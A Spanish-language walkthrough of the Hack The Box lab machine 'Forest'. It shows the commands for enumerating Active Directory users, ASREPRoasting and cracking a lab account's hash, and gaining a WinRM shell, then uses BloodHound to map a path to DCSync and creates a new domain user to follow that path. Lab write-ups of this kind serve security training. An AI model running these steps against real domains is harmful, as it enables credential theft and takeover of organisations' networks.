---
title: "HTB: Resolución de Forest"
date: 2023-07-16 16:00:00 +/-TTTT
categories: [HTB, Active Directory]
tags: [asreproasting, bloodhound, dcsync, pass the hash, crackmapexec, smbclient, smbmap, rpcclient, getnpusers.py, kerbrute, john, evil-winrm, account operators, sharphound.exe, genericall, writedacl]     ## TAG names should always be lowercase
image: forest.png
img_path: /photos/2023-07-16-Forest-WriteUp/
---

**Forest** es una máquina **Windows** de **dificultad fácil** que pone el foco en la enumeración y explotación de permisos en entornos ***Active Directory***. El inicio de la intrusión se realiza obteniendo las credenciales de un usuario a través de un ataque ***ASREPRoast***. Una vez dentro del sistema, se utiliza ***BloodHound*** para un análisis detallado de la configuración de los grupos de Active Directory. Gracias a la identificación de permisos mal configurados y la aplicación de técnicas de escalada de privilegios, como el ataque ***DCSync*** y el método ***Pass-The-Hash***, se logra obtener los privilegios de **administrador del dominio**. 

## Reconocimiento

En esta etapa, nos esforzamos por recopilar la mayor cantidad de información posible sobre nuestro objetivo.

### Identificación del Sistema Operativo con Ping

Empezamos por realizar un _**ping**_ a la máquina víctima. La finalidad del _ping_ no es solamente confirmar la conectividad, sino también deducir el sistema operativo que la máquina víctima está utilizando. ¿Cómo lo hace? Por medio del _**Time to Live (TTL)**_.

El _**TTL**_ indica cuánto tiempo o "saltos" debe permanecer el paquete en la red antes de que se descarte. Los sistemas operativos establecen diferentes valores predeterminados de TTL para los paquetes que salen, por lo que podemos usar el TTL para obtener una idea del sistema operativo del host remoto.

En este caso, un _**TTL**_ menor o igual a **64** generalmente indica que la máquina es **Linux** y un _**TTL**_ menor o igual a **128** indica que la máquina es **Windows**.

```bash
r1pfr4n@parrot> ping -c 1 10.10.10.161

PING 10.10.10.161 (10.10.10.161) 56(84) bytes of data.
64 bytes from 10.10.10.161: icmp_seq=1 ttl=127 time=109 ms

--- 10.10.10.161 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 108.867/108.867/108.867/0.000 ms
```

Observamos que el _**TTL**_ es 127, lo que sugiere que nos enfrentamos a una máquina **Windows**.

  
### Descubrimiento de puertos

El próximo paso en nuestro proceso de exploración es descubrir los puertos abiertos en la máquina víctima. Para ello, utilizamos la herramienta **nmap**. Nmap nos permite identificar los **puertos abiertos** (status open) en la máquina, que podrían ser potenciales vectores de ataque.

El comando que utilizamos es bastante detallado y hace uso de varias opciones de nmap:

-   `-sS`: Realiza un escaneo SYN. Este es un tipo de escaneo sigiloso que no completa las conexiones TCP a los puertos del host objetivo.
-   `--min-rate 5000`: Establece el número mínimo de paquetes que nmap intentará enviar por segundo.
-   `-n`: No resuelve los nombres de los hosts.
-   `-Pn`: Trata al host como si estuviera en línea y omite la fase de descubrimiento.
-   `-p-`: Escanea todos los puertos (equivalente a `-p 1-65535`).
-   `-vvv`: Aumenta la verbosidad del programa. 
-   `--open`: Muestra solo los puertos abiertos.
-   `-oG allPorts`: Guarda la salida en formato *greppable*, que es más fácil de procesar con otros programas y scripts (este formato lo utilizo para poder filtrar los puertos abiertos de los resultados del escaneo mediante expresiones regulares).

Aquí están los resultados:

```bash
r1pfr4n@parrot> sudo nmap -sS --min-rate 5000 -n -Pn -p- -vvv --open 10.10.10.161 -oG allPorts

[...]
Nmap scan report for 10.10.10.161
Host is up, received user-set (0.11s latency).
Scanned at 2023-07-14 21:51:15 CEST for 15s
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49671/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49677/tcp open  unknown          syn-ack ttl 127
49684/tcp open  unknown          syn-ack ttl 127
49703/tcp open  unknown          syn-ack ttl 127
[...]
```

Tras descubrir los puertos abiertos, procedemos a realizar un **escaneo más detallado** para conocer las versiones y los servicios que se están ejecutando en esos puertos.

```bash
r1pfr4n@parrot> nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49703 10.10.10.161 -oN targeted

Nmap scan report for 10.10.10.161
Host is up (0.11s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-07-14 20:01:25Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49703/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2023-07-14T20:02:19
|_  start_date: 2023-07-14T19:54:54
|_clock-skew: mean: 2h26m48s, deviation: 4h02m30s, median: 6m47s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2023-07-14T13:02:17-07:00
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.61 seconds
```

El comando `-sCV` realiza un escaneo de versión (-sV) y ejecuta *scripts* por defecto (-sC).

El resultado de este escaneo revela información adicional sobre los servicios en ejecución, como versiones y detalles de la configuración. A continuación, se proporciona un desglose detallado de los servicios que se han identificado en la máquina objetivo utilizando una tabla. Para cada servicio, se describe brevemente su propósito y su relevancia potencial.

| Puerto(s) | Servicio | Descripción | Relevancia |
|--------|----------|-------------|------------|
| 53 | Domain (DNS) | El servicio DNS se utiliza para resolver nombres de dominio en direcciones IP y viceversa. | Las configuraciones incorrectas o las entradas DNS malintencionadas pueden ser explotadas. |
| 88 | Kerberos | Kerberos es un protocolo de autenticación de red. | Las vulnerabilidades o debilidades en Kerberos pueden permitir la escalada de privilegios o la falsificación de identidad. |
| 135, 49664-49667, 49671, 49676, 49677, 49684, 49703 | MSRPC | Microsoft Remote Procedure Call (RPC) permite a los procesos comunicarse en una red. | Los problemas de configuración o las vulnerabilidades en RPC pueden permitir la ejecución remota de código. |
| 139/445 | NetBIOS-ssn/Microsoft-ds | NetBIOS y SMB son protocolos de compartición de archivos y servicios. | Las vulnerabilidades en SMB pueden permitir la ejecución remota de código, la escalada de privilegios o la revelación de información sensible. |
| 389/636, 3268/3269 | LDAP/LDAP SSL/Global Catalog LDAP | El Protocolo Ligero de Acceso a Directorios (LDAP) se utiliza para acceder y gestionar directorios distribuidos sobre redes IP. | Las configuraciones incorrectas o las vulnerabilidades en LDAP pueden permitir la enumeración de usuarios o la escalada de privilegios. |
| 464 | kpasswd5 | Este puerto está asociado con el servicio de cambio de contraseña de Kerberos. | Las vulnerabilidades asociadas pueden permitir la modificación de contraseñas de usuario. |
| 593, 49676 | HTTP-RPC-epmap/ncacn_http | Puntos de extremo de mapeo para RPC sobre HTTP. | Las vulnerabilidades o problemas de configuración pueden permitir la ejecución remota de código. |
| 5985, 47001 | WS-Management/WinRM | Estos servicios permiten el acceso remoto a los sistemas de administración. | Las vulnerabilidades o problemas de configuración pueden permitir la ejecución remota de código o la escalada de privilegios. |
| 9389 | .NET Message Framing | Este puerto se utiliza para la comunicación en el marco de mensajes .NET. | Las vulnerabilidades pueden permitir ataques de inyección de código o la ejecución remota de código. |

### Puertos 139/445 abiertos (SMB)

**El protocolo SMB (Server Message Block)**, que opera a través de los puertos 139 y 445, se selecciona para un reconocimiento inicial por su relevancia en la configuración de redes Windows y su conocido historial de vulnerabilidades explotables.

SMB es un protocolo de red que proporciona servicios compartidos de archivos e impresoras. Aunque es un componente esencial en los sistemas operativos Windows, también puede encontrarse en otras plataformas.

Para empezar, se utiliza la herramienta `crackmapexec` para recopilar más información sobre el servicio SMB que se ejecuta en la máquina objetivo. El comando utilizado es el siguiente:

```bash
r1pfr4n@parrot> crackmapexec smb 10.10.10.161
```

La ejecución de este comando arroja el siguiente resultado:

![imagen 2](Pasted image 20230714215723.png)

Este resultado confirma que la máquina objetivo está ejecutando **Windows Server 2016 Standard Edition**, su nombre es "**FOREST**" y es parte del dominio "**htb.local**". Además, se descubre que el **protocolo SMBv1** está habilitado en la máquina.

Para facilitar trabajos futuros, se añade el dominio "htb.local" al archivo `/etc/hosts` para permitir que se resuelva localmente:

![imagen 3](Pasted image 20230714215822.png)

A continuación, se intenta enumerar los **recursos compartidos disponibles** en la máquina objetivo. Sin embargo, a pesar de probar con diferentes herramientas, no se encuentran recursos compartidos accesibles.

Las **herramientas** y comandos utilizados para intentar enumerar los recursos compartidos son los siguientes:

```bash
r1pfr4n@parrot> smbclient -L 10.10.10.161 -N
r1pfr4n@parrot> crackmapexec smb 10.10.10.161 -u '' -p '' --shares
r1pfr4n@parrot> smbmap -H 10.10.10.161 -u 'test'
```

El comando `smbclient` proporciona la siguiente salida:

```bash
r1pfr4n@parrot> smbclient -L 10.10.10.161 -N

Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available
```

Esto sugiere que el acceso anónimo es factible, pero **no se logra visualizar ningún recurso compartido disponible**. Esto puede indicar que los recursos compartidos están restringidos a determinados usuarios, o simplemente que no existen en la máquina objetivo.

### Puerto 135 abierto (RPC)

**RPC (Remote Procedure Call)** es una tecnología utilizada en los sistemas operativos Windows para permitir que un programa ejecute código de manera remota. En este contexto, el puerto 135 se ha explorado porque ofrece múltiples oportunidades para la **enumeración de recursos del dominio**, incluyendo **usuarios, grupos, políticas** y más.

Aunque uno podría esperar que la enumeración de recursos requiriera credenciales válidas, en ciertas configuraciones de Active Directory, la **enumeración de recursos** puede ser posible incluso para un **usuario invitado**.

Para conectar con el servicio RPC se ha utilizado el siguiente comando:

```bash
r1pfr4n@parrot> rpcclient -U "" -N 10.10.10.161
```

Una vez dentro de la interfaz de `rpcclient`, se ha utilizado `enumdomusers` para enumerar los usuarios del dominio y se ha obtenido la siguiente lista de usuarios:

![imagen 4](Pasted image 20230715181933.png)

Para obtener una lista limpia de nombres de usuario, se ha guardado toda esta información en un documento `users.txt` y se ha procesado de la siguiente manera:

```bash
r1pfr4n@parrot> cat users.txt | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]' | sort -u | sponge users.txt
```

El resultado ha sido el siguiente:

```txt
$331000-VK4ADACQNUCA
Administrator
andy
DefaultAccount
Guest
HealthMailbox0659cc1
HealthMailbox670628e
HealthMailbox6ded678
HealthMailbox7108a4e
HealthMailbox83d6781
HealthMailbox968e74d
HealthMailboxb01ac64
HealthMailboxc0a90c9
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxfd87238
krbtgt
lucinda
mark
santi
sebastien
SM_1b41c9286325456bb
SM_1ffab36a2f5f479cb
SM_2c8eef0a09b545acb
SM_681f53d4942840e18
SM_75a538d3025e4db9a
SM_7c96b981967141ebb
SM_9b69f1b9d2cc45549
SM_c75ee099d0a64c91b
SM_ca8c2ed5bdab4dc9b
svc-alfresco
```

Disponer de esta lista de usuarios abre la puerta a intentar explotar el **ataque ASREPRoast**. ASREPRoast aprovecha las cuentas de usuario que tienen **desactivada** la **preautenticación Kerberos**, permitiendo al atacante solicitar hashes de contraseñas para dichas cuentas y, a partir de ahí, intentar romper estas contraseñas offline.

Además de `enumdomusers`, `rpcclient` ofrece varios comandos para enumerar diversos recursos dentro del *Active Directory*. Algunos son:

-   `enumdomgroups`: enumera todos los grupos de dominio.
-   `querydispinfo`: muestra información de visualización para todos los usuarios.
-   `querygroupmem [group RID]`: muestra los miembros del grupo especificado.
-   `queryuser [user RID]`: muestra información sobre el usuario específico. 

Por ejemplo, para saber los usuarios que conforman el grupo **Domain Admins**, podríamos ejecutar los siguientes comandos:

```bash
rpcclient $> enumdomgroups 
	group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
	group:[Domain Admins] rid:[0x200]
	[...]
rpcclient $> querygroupmem 0x200
	rid:[0x1f4] attr:[0x7]
rpcclient $> queryuser 0x1f4
	User Name   :	Administrator
	[...]
```

El grupo **Domain Admins** está conformado por un único usuario: **Administrator**.

Como alternativa a `rpcclient`, también se podría haber utilizado `crackmapexec` para la enumeración de usuarios:

```bash
r1pfr4n@parrot> crackmapexec smb 10.10.10.161 -u '' -p '' --users
```


## Obteniendo shell como svc-alfresco

Una vez que tengamos nuestra lista de usuarios del dominio, estamos en posición de intentar un ataque ASREPRoast. Este ataque se basa en explotar una debilidad específica en el protocolo de autenticación Kerberos. 

Se explicará primero como funciona el protocolo Kerberos, luego en qué consiste el ataque ASREPRoast y finalmente se explotará el ataque para conseguir la contraseña del usuario *svc-alfresco*.

### Protocolo Kerberos

El protocolo **Kerberos** proporciona autenticación mutua entre un cliente y un servidor en una red no segura. Esto se logra mediante el uso de tickets de concesión de servicio (TGS) y tickets de concesión de autenticación (TGT). A continuación se desglosan todos los pasos de la autenticación de Kerberos, teniendo en cuenta la siguiente imagen:

![imagen 5](Pasted image 20230715184901.png)

1.  **Solicitud de TGT**: El cliente envía una solicitud al Servicio de Autenticación (AS) para obtener un TGT.
2.  **Emisión de TGT**: El AS verifica las credenciales del cliente. Si son válidas, el AS emite un TGT y una clave de sesión al cliente. El TGT está cifrado con la clave del servicio de concesión de ticket (KRBTGT) y la **clave de la sesión** **se cifra con la contraseña del cliente**. Esta última es la parte que se explota en el ataque **ASREPRoast**.
3.  **Solicitud de TGS**: Cuando el cliente desea acceder a un servicio, envía una solicitud al Servicio de Concesión de Ticket (TGS), incluyendo el TGT y un autenticador que contiene la ID del cliente y la marca de tiempo, cifrado con la clave de sesión.
4.  **Emisión de TGS**: El TGS descifra el TGT, obteniendo la clave de la sesión, y luego descifra el autenticador. Si la solicitud es válida, el TGS emite un ticket de servicio (cifrado con la clave del servicio) y una nueva clave de sesión (cifrado con la contraseña del cliente) al cliente.    
5.  **Solicitud de servicio**: El cliente se comunica con el servidor enviando el ticket de servicio y un nuevo autenticador cifrado con la nueva clave de sesión.
6.  **Acceso al servicio**: El servidor SQL descifra el ticket de servicio con su clave, obteniendo la nueva clave de sesión, y luego descifra el autenticador. Si la solicitud es válida, el cliente es autenticado y puede acceder al servicio.

### ASREPRoast o AS-REP Roasting en detalle

ASREPRoast, también conocido como AS-REP Roasting, debe su nombre a la etapa de respuesta AS-REP del protocolo Kerberos, que es donde se lleva a cabo el ataque. Se centra en explotar una característica específica de la implementación de Kerberos: la capacidad de desactivar la **"preautenticación"**.

Cuando un usuario solicita un TGT al **Servicio de Autenticación (AS)**, normalmente debe proporcionar preautenticación, una prueba de que conoce su contraseña, antes de que se le otorgue un TGT.

Si la preautenticación está desactivada para un usuario, el AS devuelve un mensaje AS-REP que incluye el TGT y la **clave de sesión cifrada con la contraseña del usuario**. Este mensaje normalmente requeriría una prueba de conocimiento de la contraseña, pero sin preautenticación, se proporciona directamente.

Un atacante puede solicitar un TGT para dicho usuario y recibir la clave de sesión cifrada sin necesidad de conocer previamente la contraseña del usuario. Esto es crucial para el ataque ASREPRoast.

El ataque ASREPRoast implica la captura de estas **claves de sesión cifradas** y su descifrado fuera de línea mediante técnicas de fuerza bruta. Como la clave de la sesión está cifrada con la contraseña del usuario, descifrar la clave de sesión resulta en obtener la contraseña del usuario.

### Explotación de ASREPRoast para obtener las credenciales de svc-alfresco

En base a la enumeración previa realizada con `rpcclient`, se obtuvo una lista de usuarios del dominio. El siguiente paso consiste en solicitar un TGT para cada uno de estos usuarios, con la intención de identificar cualquier cuenta que tenga activada la opción `UF_DONT_REQUIRE_PREAUTH`. Esta opción deshabilita la preautenticación, lo que hace que las cuentas sean vulnerables al ataque ASREPRoast que se ha discutido anteriormente.

Existen varias herramientas para explotar ASREPRoast, dos de las cuales son `GetNPUsers.py` y `Kerbrute`. Aquí se muestran los comandos utilizados con ambas herramientas:

-   Utilizando **GetNPUsers.py**:

```bash
r1pfr4n@parrot> GetNPUsers.py -no-pass -usersfile users.txt htb.local/ -outputfile hash
```

Esta herramienta es de [Impacket](https://github.com/fortra/impacket).

- Utilizando **Kerbrute**:

```bash
r1pfr4n@parrot> ./kerbrute userenum --dc 10.10.10.161 -d htb.local ../users.txt --hash-file hash --downgrade 
```

[Descarga de Kerbrute](https://github.com/ropnop/kerbrute).

Ambos comandos solicitan un TGT para cada usuario listado en `users.txt` en el dominio `htb.local`. Si la preautenticación está desactivada para algún usuario, se recibe un TGT cifrado junto con la clave de sesión cifrada, que se guarda en el archivo `hash`.

Los resultados indican que el usuario `svc-alfresco` tiene habilitado el atributo `UF_DONT_REQUIRE_PREAUTH` y, por lo tanto, es **vulnerable a ASREP-Roasting**:

![imagen 6](Pasted image 20230714221709.png)

Una vez obtenido su hash, el siguiente paso es intentar descifrarlo utilizando una herramienta como `john` y una lista de palabras conocida, en este caso, `rockyou.txt`:

```bash
r1pfr4n@parrot> john -w=/usr/share/wordlists/rockyou.txt hash --format=krb5asrep
```

Este comando utiliza `john` para realizar un ataque de fuerza bruta en el hash obtenido, intentando cada palabra en `rockyou.txt` como una posible contraseña. Finalmente, se logra descifrar la clave de sesión y se obtiene la contraseña del usuario `svc-alfresco`: `s3rvice`:

![imagen 7](Pasted image 20230714221738.png)

### Obtención de shell a través de WinRM como svc-alfresco

Ahora que se ha obtenido las credenciales de `svc-alfresco`, es posible avanzar y explorar nuevas formas de explotación. En concreto, se buscará acceder a la máquina objetivo utilizando el servicio **Windows Remote Management (WinRM)**.

**WinRM** es un servicio de administración remota basado en estándares que se incluye con Windows Server. Permite a los administradores de sistemas ejecutar comandos de administración y scripts en sistemas remotos a través de la red. Recordemos que, durante la fase de escaneo inicial, se identificó que el puerto **5985**, el puerto predeterminado para WinRM, estaba abierto.

Antes de intentar la conexión, es importante verificar que el usuario `svc-alfresco` tiene permisos para acceder al servicio WinRM. Para ello, se utiliza la herramienta `crackmapexec`:

```bash
r1pfr4n@parrot> crackmapexec winrm 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```

Este comando verifica si las credenciales proporcionadas permiten el acceso al servicio WinRM en el host objetivo. Si el resultado muestra `Pwned!`, eso indica que el usuario `svc-alfresco` tiene los permisos necesarios para acceder a WinRM, probablemente debido a que pertenece al grupo `Remote Management Users`.

![imagen 8](Pasted image 20230714222030.png)

Una vez confirmado el acceso, se puede conectar a WinRM utilizando la herramienta `evil-winrm`:

```bash
r1pfr4n@parrot> evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3rvice'
```

`Evil-winrm` es una herramienta de shell interactiva que permite la administración remota de la máquina objetivo. Al ejecutar el comando anterior, se inicia una conexión con la máquina objetivo a través del servicio WinRM utilizando las credenciales de `svc-alfresco`. Si todo sale según lo previsto, se obtendrá una shell que permitirá una exploración más profunda del sistema:

![imagen 9](Pasted image 20230714222120.png)

### user.txt 

Encontraremos la **primera flag** en el directorio **Desktop** del usuario **svc-alfresco**:

```powershell
PS C:\> type C:\Users\svc-alfresco\Desktop\user.txt
1660df21057****50a9a7bce631c006e
```

## Obteniendo shell como Administrator

Después de obtener una **shell** inicial con el usuario **svc-alfresco**, el siguiente objetivo es escalar privilegios hasta conseguir una **shell** como **administrador del dominio**. Para esto, se debe realizar una serie de tareas de enumeración y explotación adicionales.

### Enumeración

El primer paso en este proceso de escalado de privilegios es la **enumeración** adicional **del Controlador de Dominio (DC)**. 

#### Grupos de svc-alfresco

Un área particular de interés durante la enumeración es determinar a qué **grupos** pertenece el usuario **svc-alfresco**. Los grupos de los que un usuario forma parte pueden determinar qué recursos y servicios puede acceder, y pueden revelar posibles rutas para el escalado de privilegios.

El comando para consultar los grupos de **svc-alfresco** es:

```powershell
PS C:\> whoami /groups
```

El resultado es el siguiente:

![imagen 10](Pasted image 20230715200805.png)

En este caso, la enumeración reveló que el usuario **svc-alfresco** es **miembro** de un grupo particularmente interesante: **BUILTIN\Account Operators**. Según la documentación oficial de [Microsoft](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators), los miembros de este grupo tienen la capacidad de **crear** y **modificar** la mayoría de los tipos de **cuentas**, incluyendo cuentas de usuarios, grupos locales y grupos globales.

Entendiendo esto, es posible crear un nuevo usuario en el dominio utilizando el comando `net user <nombre de usuario> <contraseña> /add`. Aunque este nuevo usuario no tiene todavía privilegios administrativos, esto puede suponer un avance significativo en el progreso del ataque.

#### Enumeración con BloodHound

Durante el proceso de infiltración en una red, especialmente en entornos Active Directory, es esencial realizar una tarea de enumeración detallada. En este contexto, la utilización de **BloodHound** es de gran valor, dado que permite visualizar de forma gráfica las **relaciones existentes entre los elementos del dominio** (usuarios, grupos, computadoras, etc.), facilitando el **descubrimiento de caminos de ataque**.

##### ¿Qué es BloodHound y cómo funciona?

**BloodHound** es una herramienta de análisis gráfico de relaciones en Active Directory que utiliza la *teoría de grafos* para descubrir las posibles vías de ataque menos privilegiadas que pueden llevar a una entidad a obtener más privilegios dentro del dominio. La herramienta utiliza su colector, **SharpHound**, para recolectar información del dominio y luego presenta esta información en una interfaz gráfica que facilita su análisis.

##### Recolección de información con SharpHound

Para obtener la información necesaria, se utiliza **SharpHound**. Esta herramienta se puede encontrar en versión [.exe](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe) o bien en versión [.ps1](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1). 

El primer paso será subir **SharpHound.exe** al controlador de dominio. En este caso se utilizará el comando `upload` de **evil-winrm**:

```powershell
PS C:\Users\s\Documents> upload /home/r1pfr4n/Desktop/HTB/Forest/content/SharpHound.exe
```

Seguidamente se ejecutará SharpHound.exe con los siguientes parámetros:

```powershell
PS C:\Users\s\Documents> .\SharpHound.exe -c all --LdapUsername 'svc-alfresco' --LdapPassword 's3rvice' --domaincontroller 10.10.10.161 -d htb.local
```

Los parámetros utilizados en este comando son:

- `-c all`: Recoge todos los tipos de datos disponibles.
- `--LdapUsername` y `--LdapPassword`: Se especifican las credenciales de un usuario válido en el dominio, en este caso 'svc-alfresco' con la contraseña 's3rvice'.
- `--domaincontroller`: Se especifica la dirección IP del controlador de dominio, 10.10.10.161 en este caso.
- `-d htb.local`: Se especifica el nombre del dominio.

![imagen 11](Pasted image 20230715235157.png)

Finalizada la ejecución, **SharpHound.exe** generará un archivo **zip** con los **datos que ha recolectado**. Este zip deberá ser transportado a la máquina atacante para su posterior análisis con **BloodHound**. En este caso se utilizará el comando `download` de **evil-winrm** para descargar el zip:

```powershell
PS C:\Users\s\Documents> download C:\Users\svc-alfresco\Documents\20230715012300_BloodHound.zip bh.zip
```

Más información sobre la utilización de **SharpHound** y posibles configuraciones de la herramienta se puede encontrar en la página de [The Hacker Recipes](https://www.thehacker.recipes/ad/recon/bloodhound).

##### Configuración de Neo4j y BloodHound

**BloodHound** necesita una base de datos para operar, y utiliza **Neo4j**, una base de datos gráfica. Si no está instalado, se puede seguir la guía de instalación de la [documentación oficial de Neo4j](https://neo4j.com/docs/operations-manual/current/installation/linux/debian/#debian-installation). 

Los comandos para instalar **neo4j 5.6.0** son los siguientes:

```bash
wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
echo 'deb https://debian.neo4j.com stable latest' | sudo tee -a /etc/apt/sources.list.d/neo4j.list
sudo apt-get update
sudo apt-get install neo4j=1:5.6.0
```

Una vez instalado **Neo4j**, se debe ejecutar con el comando `sudo neo4j console`. Si es la primera vez que se inicia, se deberá **configurar un usuario y una contraseña** que se usarán después en BloodHound. El panel de configuración de Neo4j suele residir en *http://localhost:7474/*.

##### Ejecución de BloodHound

Con **Neo4j** funcionando, ya se puede iniciar **BloodHound**. Para ello, es necesario descargar la versión adecuada para el sistema operativo desde el [repositorio oficial de BloodHound](https://github.com/BloodHoundAD/BloodHound/releases). Una vez descargado y descomprimido, se encontrará el ejecutable de BloodHound. Al ejecutarlo, aparecerá una pantalla de inicio de sesión en la que se deben proporcionar las credenciales configuradas en Neo4j.

Una vez se ha accedido a **BloodHound**, en la parte superior derecha, se debe pinchar en "**Upload Data**". En este punto, se deberá **subir** el **archivo zip generado por SharpHound**:

![imagen 12](Pasted image 20230716181840.png)

Al finalizar la carga de los archivos, ya se puede comenzar con el análisis y reconocimiento del dominio utilizando **BloodHound**.

##### Identificando el camino al dominio con BloodHound

Comenzando con el análisis, es una buena práctica **marcar** los usuarios cuyas credenciales se han obtenido como **Owned**. En este caso, se marca al usuario **svc-alfresco**. Esta acción no es solo una cuestión de llevar un registro, sino que también abre la posibilidad de utilizar algunas consultas adicionales en **BloodHound**, que pueden revelar rutas de ataque potencialmente ocultas:

![imagen 13](Pasted image 20230716182658.png)

Mirando la información presentada por **BloodHound**, se puede observar una **posible vía** para elevar privilegios y convertirse en administrador, **partiendo desde el grupo "Account Operators"**, del que el usuario **svc-alfresco** forma parte:

![imagen 14](Pasted image 20230716184053.png)

El grupo "**Account Operators**" tiene un privilegio llamado **"GenericAll"** sobre el grupo "**Exchange Windows Permissions**". Es importante entender qué implica este privilegio: **"GenericAll"** en términos de Active Directory, significa que se tienen **todos los posibles permisos sobre el objeto en cuestión**. En este caso, el usuario "svc-alfresco", como miembro del grupo "Account Operators", puede realizar cualquier operación sobre los miembros del grupo "Exchange Windows Permissions", incluyendo **añadir nuevos miembros a este grupo**.

![imagen 15](Pasted image 20230716185224.png)

Por otro lado, el grupo "**Exchange Windows Permissions**" tiene un privilegio llamado **"WriteDacl"** sobre el dominio **htb.local**. Este privilegio permite a un usuario o grupo modificar la lista de control de acceso discrecional (DACL) de un objeto. En otras palabras, los **miembros** del grupo "**Exchange Windows Permissions**" pueden **modificar los permisos de cualquier objeto** dentro del dominio **htb.local**, incluyendo el objeto de dominio en sí.

Esto abre la puerta a un potencial ataque de escalada de privilegios a través de un **DCSync Attack**. DCSync es un ataque que abusa de la capacidad de replicación de los controladores de dominio en un entorno Active Directory. Un atacante que tiene los derechos necesarios puede **replicar las contraseñas de hash de todos los usuarios del dominio**, incluyendo la del Administrador.

![imagen 16](Pasted image 20230716185317.png)

Entonces, un posible camino para escalar privilegios sería el siguiente:

1.  Utilizar las credenciales de **svc-alfresco** para agregar un nuevo usuario al grupo "Exchange Windows Permissions", aprovechando el privilegio **"GenericAll"** que tiene sobre este grupo.
2.  Usar este nuevo usuario, que ahora es miembro del grupo "Exchange Windows Permissions", para modificar la DACL del dominio **htb.local** y otorgarse los permisos necesarios para llevar a cabo un **DCSync Attack**.
3.  Ejecutar un **DCSync Attack** para obtener las contraseñas de hash de los usuarios del dominio, incluyendo la del Administrador.

### Elevación de Privilegios: De Usuario a Administador del dominio

Para continuar con el camino de escalada de privilegios que BloodHound nos ha mostrado, se deben tomar dos acciones principales. **Primero**, se necesita **agregar** el usuario **svc-alfresco** **o un nuevo usuario** al grupo "**Exchange Windows Permissions**", y **segundo**, se deben **asignar** los **permisos DCSync a ese usuario**.

En el caso de **svc-alfresco**, aunque se puede agregar al grupo "Exchange Windows Permissions", se ha detectado que un **script en el sistema restablece periódicamente sus pertenencias de grupo**. Este script se estudiará más en detalle en [el Anexo II](#anexo-ii-script-de-reinicio-de-cuenta-y-permisos). Por lo tanto, se sugiere **crear un nuevo usuario en el dominio** (Recordemos que svc-alfresco lo puede crear porque pertenece al grupo Account Operators). En este caso se ha creado un usuario llamado *fran* con la contraseña *fran123$!*. Se pueden usar los siguientes comandos para realizar estas acciones:

```powershell
PS C:\> net user fran fran123$! /add  
PS C:\> net group "Exchange Windows Permissions" fran /add
```

